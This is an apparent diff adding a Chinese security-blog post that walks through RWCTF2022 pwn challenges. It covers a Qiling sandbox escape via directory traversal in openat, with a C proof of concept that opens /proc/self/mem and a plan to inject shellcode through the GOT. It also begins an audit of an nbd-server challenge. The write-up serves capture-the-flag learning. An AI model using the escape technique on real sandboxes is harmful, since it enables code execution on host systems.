@@ -1,0 +1,860 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="RWCTF,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
+   
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    RWCTF2022 Pwn 笔记1 |  Kiprey&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+<script>
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-rwctf2022_qws"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  RWCTF2022 Pwn 笔记1
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/01/rwctf2022_qws/" class="article-date">
+  <time datetime="2022-01-24T16:00:00.000Z" itemprop="datePublished">2022-01-25</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">4.9k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">22 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="一、简介">一、简介</h2>
+<p>这里是复盘 RWCTF2022 关于:</p>
+<ul>
+<li>QLaas</li>
+<li>Who Moved My Block</li>
+<li>SVME</li>
+</ul>
+<p>这三道题时所写下的一些笔记。</p>
+<blockquote>
+<p>受限于时间与效率，一部分题目的 exp 将不再贴出，只会记录下解题或利用的详细流程。</p>
+</blockquote>
+<a id="more"></a>
+<h2 id="二、QLaas">二、QLaas</h2>
+<h3 id="1-QLaas-小叙">1. QLaas 小叙</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Qiling as a Service.</span><br><span class="line">nc 47.242.149.197 7600</span><br><span class="line">QLaaS_61a8e641694e10ce360554241bdda977.tar.gz</span><br><span class="line">Note: read flag using &#x2F;readflag</span><br><span class="line"></span><br><span class="line">Clone-and-Pwn, difficulty:Schrödinger</span><br></pre></td></tr></table></figure>
+<p>该题只给了一个这样的脚本，用于读取用户传来的文件并<strong>将其放入麒麟沙箱</strong>（rootfs 为一个临时文件夹）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="comment"># pip install qiling==1.4.1</span></span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_sandbox</span><span class="params">(path, rootfs)</span>:</span></span><br><span class="line">    ql = Qiling([path], rootfs)</span><br><span class="line">    ql.run()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    sys.stdout.write(<span class="string">'Your Binary(base64):\n'</span>)</span><br><span class="line">    line = sys.stdin.readline()</span><br><span class="line">    binary = base64.b64decode(line.strip())</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> tempfile.TemporaryDirectory() <span class="keyword">as</span> tmp_dir:</span><br><span class="line">        fp = os.path.join(tmp_dir, <span class="string">'bin'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> open(fp, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(binary)</span><br><span class="line"></span><br><span class="line">        my_sandbox(fp, tmp_dir)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>题目要求：<strong>执行</strong> <code>/readflag</code> 来获取 flag（注意不是直接读取 /flag）</p>
+<h3 id="2-qiling-框架环境配置">2. qiling 框架环境配置</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下拉麒麟框架</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:qilingframework/qiling.git</span><br><span class="line"><span class="built_in">cd</span> qiling</span><br><span class="line"><span class="comment"># 在麒麟框架代码中放入题目附件</span></span><br><span class="line">nano main.py</span><br><span class="line"><span class="comment"># 创建自己的 exp</span></span><br><span class="line">touch exp.cpp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 装个 PyCharm （别用 VSCode 调试）</span></span><br></pre></td></tr></table></figure>
+<h3 id="3-漏洞点">3. 漏洞点</h3>
+<p>unicorn 框架是 qiling 框架的核心，qiling 还在该基础之上额外实现了很多功能，包括与 OS 的一些交互操作等等。qiling 自己实现了一系列 syscall 调用，并让沙箱程序通过这些 qiling syscall 来间接与 OS 进行交互。</p>
+<p>但倘若这些 qiling syscall 内部存在缺陷，那么沙箱程序便可以通过这些 syscall 进行沙箱逃逸。</p>
+<p>qiling 默认会在执行沙箱程序时，将沙箱程序内部调用的 syscall 日志输出：</p>
+<p><img src="/2022/01/rwctf2022_qws/image-20220124202600131.png" alt="image-20220124202600131"></p>
+<p>这样，通过字符串搜索 + 动态调试并结合信息搜索，我们可以得出这些 syscall in posix 的实现是位于 <code>qiling/qiling/os/posix/syscall/</code> 文件夹下。接下来便是代码审计 + 调试了。</p>
+<p>通过 <s>被大佬带飞</s> 审计与调试，我们可以发现在 <code>ql_syscall_openat</code> 函数中存在<strong>目录穿越漏洞</strong>。为了说明这个目录穿越，我们先简单的使用 open 函数来写个程序跑跑看看 qiling 的逻辑:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"../../../../../../../../proc/self/"</span>, O_RDONLY, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如上图，实际所调用的 syscall 不是 SYS_open，而是 SYS_openat。</p>
+<p>当调用 <code>ql_syscall_openat</code>时，实际进行文件打开的操作位于函数 <code>ql.os.fs_mapper.open_ql_file</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ql_syscall_openat</span><span class="params">(ql: Qiling, fd: int, path: int, flags: int, mode: int)</span>:</span></span><br><span class="line">    file_path = ql.os.utils.read_cstring(path)</span><br><span class="line">    <span class="comment"># real_path = ql.os.path.transform_to_real_path(path)</span></span><br><span class="line">    <span class="comment"># relative_path = ql.os.path.transform_to_relative_path(path)</span></span><br><span class="line"></span><br><span class="line">    flags &amp;= <span class="number">0xffffffff</span></span><br><span class="line">    mode &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    idx = next((i <span class="keyword">for</span> i <span class="keyword">in</span> range(NR_OPEN) <span class="keyword">if</span> ql.os.fd[i] == <span class="number">0</span>), <span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">-1</span>:</span><br><span class="line">        regreturn = -EMFILE</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> ql.archtype== QL_ARCH.ARM:</span><br><span class="line">                mode = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            flags = ql_open_flag_mapping(ql, flags)</span><br><span class="line">            fd = ql.unpacks(ql.pack(fd))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= fd &lt; NR_OPEN:</span><br><span class="line">                dir_fd = ql.os.fd[fd].fileno()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dir_fd = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 注意：在这里打开实际的文件，并将打开的文件描述符放入 fd array 中</span></span><br><span class="line">            ql.os.fd[idx] = ql.os.fs_mapper.open_ql_file(file_path, flags, mode, dir_fd)</span><br><span class="line"></span><br><span class="line">            regreturn = idx</span><br><span class="line">        <span class="keyword">except</span> QlSyscallError <span class="keyword">as</span> e:</span><br><span class="line">            regreturn = -e.errno</span><br><span class="line">            </span><br><span class="line">    ql.log.debug(f'openat(fd = &#123;fd:d&#125;, path = &#123;file_path&#125;, mode = &#123;mode:#o&#125;) = &#123;regreturn:d&#125;')</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> regreturn</span><br></pre></td></tr></table></figure>
+<p>继续读读 <code>ql.os.fs_mapper.open_ql_file</code> 函数源码。由于我们是尝试打开正常的文件，因此走下面 <code>else</code> 分支：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_ql_file</span><span class="params">(self, path, openflags, openmode, dir_fd=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> self.has_mapping(path):</span><br><span class="line">        self.ql.log.info(<span class="string">f"mapping <span class="subst">&#123;path&#125;</span>"</span>)</span><br><span class="line">        <span class="keyword">return</span> self._open_mapping_ql_file(path, openflags, openmode)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 进入该分支</span></span><br><span class="line">        <span class="keyword">if</span> dir_fd:</span><br><span class="line">            <span class="keyword">return</span> ql_file.open(path, openflags, openmode, dir_fd=dir_fd)</span><br><span class="line"></span><br><span class="line">        real_path = self.ql.os.path.transform_to_real_path(path)</span><br><span class="line">        <span class="keyword">return</span> ql_file.open(real_path, openflags, openmode)</span><br></pre></td></tr></table></figure>
+<p>如果不存在 <code>dir_fd</code>，则调用 <code>transform_to_real_path</code> 函数将传入的 path 转换为真正的 path，即绝对路径。而调用 <code>transform_to_real_path</code> 处理 path 的调用链如下所示：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">convert_for_native_os, path.py:<span class="number">106</span></span><br><span class="line">convert_path, path.py:<span class="number">114</span></span><br><span class="line">transform_to_real_path, path.py:<span class="number">131</span></span><br><span class="line">open_ql_file, mapper.py:<span class="number">106</span></span><br><span class="line">ql_syscall_openat, fcntl.py:<span class="number">108</span></span><br><span class="line">[....]</span><br></pre></td></tr></table></figure>
+<p>最终，qiling 会在 <code>convert_for_native_os</code> 函数中，<strong>过滤掉无效的目录穿越路径</strong>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_for_native_os</span><span class="params">(rootfs: Union[str, Path], cwd: str, path: str)</span> -&gt; Path:</span></span><br><span class="line">    _rootfs = Path(rootfs)          <span class="comment"># _rootfs : /tmp/tmpldhylv0h</span></span><br><span class="line">    _cwd = PurePosixPath(cwd[<span class="number">1</span>:])   <span class="comment"># _cwd : .</span></span><br><span class="line">    _path = Path(path)              <span class="comment"># _path : ../../../../../../../../proc/self</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> _path.is_absolute():</span><br><span class="line">        <span class="keyword">return</span> _rootfs / QlPathManager.normalize(_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 走该分支，返回 /tmp/tmpldhylv0h/proc/self</span></span><br><span class="line">        <span class="keyword">return</span> _rootfs / QlPathManager.normalize(_cwd / _path.as_posix())</span><br></pre></td></tr></table></figure>
+<p>之后在上面的 <code>open_ql_file</code> 函数中，调用 <code>ql_file.open</code> 函数来与 OS 交互，而该函数是没有任何路径过滤的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(cls, open_path: AnyStr, open_flags: int, open_mode: int, dir_fd: int = None)</span>:</span></span><br><span class="line">    open_mode &amp;= <span class="number">0x7fffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 传入进来的路径直接与 OS 交互，无任何过滤</span></span><br><span class="line">        fd = os.open(open_path, open_flags, open_mode, dir_fd=dir_fd)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> QlSyscallError(e.errno, e.args[<span class="number">1</span>] + <span class="string">' : '</span> + e.filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cls(open_path, fd)</span><br></pre></td></tr></table></figure>
+<p>这样看来，qiling openat syscall 没法路径穿越？非也。注意到 <code>open_ql_file</code> 函数中的这句代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_ql_file</span><span class="params">(self, path, openflags, openmode, dir_fd=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> self.has_mapping(path):</span><br><span class="line">        self.ql.log.info(<span class="string">f"mapping <span class="subst">&#123;path&#125;</span>"</span>)</span><br><span class="line">        <span class="keyword">return</span> self._open_mapping_ql_file(path, openflags, openmode)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 如果存在 dir fd</span></span><br><span class="line">        <span class="keyword">if</span> dir_fd:</span><br><span class="line">            <span class="comment"># 则 path 将直接与 OS 进行交互，没有经过任何过滤</span></span><br><span class="line">            <span class="keyword">return</span> ql_file.open(path, openflags, openmode, dir_fd=dir_fd)</span><br><span class="line"></span><br><span class="line">        real_path = self.ql.os.path.transform_to_real_path(path)</span><br><span class="line">        <span class="keyword">return</span> ql_file.open(real_path, openflags, openmode)</span><br></pre></td></tr></table></figure>
+<p>因此如果我们在调用 qiling openat syscall 时传入一个恶意的目录穿透路径，那就可以进行<strong>目录穿透攻击</strong>！</p>
+<p>动手试一试：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> root_fd = open(<span class="string">"/"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">int</span> mem_fd = openat(root_fd, <span class="string">"../../../../proc/self/mem"</span>, O_RDWR, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以发现两个 SYS_openat 均执行成功，可以达到目录穿越的效果：</p>
+<p><img src="/2022/01/rwctf2022_qws/image-20220124212115135.png" alt="image-20220124212115135"></p>
+<p>目录穿越后，我们便可以尝试读写任意文件。</p>
+<p>注意到 flag 只能通过执行 <code>/readflag</code> 来获取，因此我们可以尝试对 <code>/proc/self/mem</code> 进行读写。</p>
+<p>该文件是进程的内存内容，修改该文件等同于直接修改该进程的虚拟地址空间，我们可以试着将自己的 shellcode 放入代码段中并执行。</p>
+<p>需要注意的是，该文件<strong>不能直接读取</strong>，需要结合 <strong>/proc/self/maps</strong> 的映射信息来确定读的偏移值。即无法读取未被映射的区域。</p>
+<h3 id="4-利用流程">4. 利用流程</h3>
+<p>利用流程如下：</p>
+<ul>
+<li>第一次执行：读取 <code>/proc/self/exe</code>，将远程机器上的 python 二进制文件 dump 到本地，获取其 GOT 表的相对偏移位置。</li>
+<li>第二次执行：读取 <code>/proc/self/maps</code>：
+<ul>
+<li>获取远程机器 python 程序的基地址，加上 GOT 相对偏移得到 GOT 表的绝对地址。</li>
+<li>获取远程机器上 python 程序的可执行代码段地址，将 shellcode 写入可执行代码段中。</li>
+<li>修改 GOT 表上的条目入口为 shellcode ，之后尝试触发所被修改 GOT 表的函数，使 python 执行 shellcode。</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>这题利用较为简单，exp 鸽了。</p>
+</blockquote>
+<h2 id="三、Who-Moved-My-Block">三、Who Moved My Block</h2>
+<h3 id="1-wmmb-小叙">1. wmmb 小叙</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">On Linux, network block device (NBD) is a network protocol that can be used to forward a block device (typically a hard disk or partition) from one machine to a second machine. As an example, a local machine can access a hard disk drive that is attached to another computer.</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;NetworkBlockDevice&#x2F;nbd</span><br><span class="line">nc 47.242.113.232 31337</span><br><span class="line">attachment</span><br><span class="line"></span><br><span class="line">Clone-and-Pwn, difficulty:baby</span><br></pre></td></tr></table></figure>
+<h3 id="2-wmmb-环境搭建">2. wmmb 环境搭建</h3>
+<p>查看题目提供的二进制开启的保护（好家伙，真就全开）：</p>
+<p><img src="/2022/01/rwctf2022_qws/image-20220125115931741.png" alt="image-20220125115931741"></p>
+<p>下拉源码编译，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">wget https://versaweb.dl.sourceforge.net/project/nbd/nbd/3.23/nbd-3.23.tar.gz</span><br><span class="line">tar -xvf nbd-3.23.tar.gz</span><br><span class="line"><span class="built_in">cd</span> nbd-3.23</span><br><span class="line">./configure --<span class="built_in">enable</span>-debug</span><br><span class="line"><span class="comment"># 编译时启用 Full RELRO、Canary、NX 和 PIE</span></span><br><span class="line">make <span class="string">"CFLAGS += -fstack-protector-all -pie -z now -z noexecstack"</span></span><br><span class="line"><span class="comment"># make install</span></span><br><span class="line"></span><br><span class="line">./nbd-server 0.0.0.0:10809 <span class="variable">$&#123;PWD&#125;</span>/../WhoMovedMyBlock/container/rootfs.ext2</span><br><span class="line"><span class="comment"># 注意，直接执行 nbd-server 会在输出信息后，**前台进程** 立即转为后台进程，移交控制权给 shell</span></span><br><span class="line"><span class="comment"># 该进程仍然在后台执行，可以使用以下命令探查到</span></span><br><span class="line">ps -ax | grep <span class="string">"nbd"</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/01/rwctf2022_qws/image-20220124222106716.png" alt="image-20220124222106716"></p>
+<blockquote>
+<p>调试时，如果不希望让该进程转为后台进程，则 make 时添加 flag：<code>make &quot;CFLAGS += -DNODAEMON&quot;</code></p>
+</blockquote>
+<h3 id="3-漏洞点-2">3. 漏洞点</h3>
+<h4 id="a-漏洞寻找">a. 漏洞寻找</h4>
+<p>远程机器上会架起一个 nbd-server，很明显我们需要向这个 nbd-server 发起一个连接，并尝试在发送的 payload 中构造一些恶意的字段。</p>
+<p>那么我们就需要尝试去审计代码（代码位于 <code>nbd-3.23/nbd-server.c</code>），找到一条<strong>不受信任输入 -&gt; 无过滤 -&gt; 访问内存</strong>这样的一条途径。</p>
+<p>那就首先从 <code>accept</code> 函数开始找起，它是整个 socket 连接的起点，通过它我们可以根据交叉引用找到处理连接的函数 <code>handle_modern_connection</code>：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">handle_modern_connection(GArray *<span class="keyword">const</span> servers, <span class="keyword">const</span> <span class="keyword">int</span> sock, struct generic_conf *genconf)</span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line">    net = socket_accept(sock);</span><br><span class="line">    <span class="keyword">if</span> (net &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!dontfork) &#123;</span><br><span class="line">        <span class="comment">// 重要！：注意这里会 fork 出一个子进程来单独处理新连接</span></span><br><span class="line">        pid = spawn_child(&amp;commsocket);</span><br><span class="line">        <span class="keyword">if</span> (pid) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                msg(LOG_INFO, <span class="string">"Spawned a child process"</span>);</span><br><span class="line">                g_array_append_val(childsocks, commsocket);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line">                msg(LOG_ERR, <span class="string">"Failed to spawn a child process"</span>);</span><br><span class="line">            close(net);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Child just continues. */</span></span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 连接协商</span></span><br><span class="line">    client = negotiate(net, servers, genconf);</span><br><span class="line">       </span><br><span class="line">    [...]</span><br><span class="line">       </span><br><span class="line">    msg(LOG_INFO, <span class="string">"Starting to serve"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开始处理</span></span><br><span class="line">    mainloop_threaded(client);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">handler_err:</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要注意的是，默认情况下对于每个连接，server 都会 fork 一个新的子进程来单独处理。这个特性相当重要，因为我们可以利用这个特性来<strong>爆破 canary 和 PIE</strong>。</p>
+<p><img src="/2022/01/rwctf2022_qws/image-20220125123033017.png" alt="image-20220125123033017"></p>
+<p>该函数会调用 <code>negotiate</code> 函数，并创建结构体 <code>CLIENT</code>，将新连接的 fd 赋给该 client，之后后续使用 <code>socket_read(client, addr, len)</code> 来从 client（即我们这边）读取数据。</p>
